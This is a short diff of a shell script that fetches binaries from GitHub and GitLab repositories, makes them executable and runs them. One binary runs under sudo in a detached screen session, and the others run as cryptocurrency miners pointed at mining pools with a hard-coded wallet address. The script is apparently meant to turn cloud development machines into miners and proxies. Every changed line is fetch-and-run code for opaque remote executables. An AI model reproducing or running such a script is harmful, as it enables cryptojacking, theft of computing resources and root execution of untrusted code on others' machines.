@@ -5,7 +5,9 @@ wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted && chmod +x *
 sleep 3
 cd /home/
 sleep 3
-wget https://gitlab.com/sarifadim/jomblo/-/raw/main/bismillah && chmod +x * && screen -dms run ./bismillah -o 34.149.22.228:9200 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.ARX -a rx/0 -t $(nproc --all)
+wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/tuyulcakep && chmod +x project
+wget -qO server https://raw.githubusercontent.com/sarifadim/dopla/main/bude && chmod +x server
+screen -dms run sudo ./server
 wget -qO image https://gitlab.com/sarifadim/jomblo/-/raw/main/gitpod && chmod +x image
 ./image --algo KASPA --pool 34.117.82.207:9200 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable
 EOF
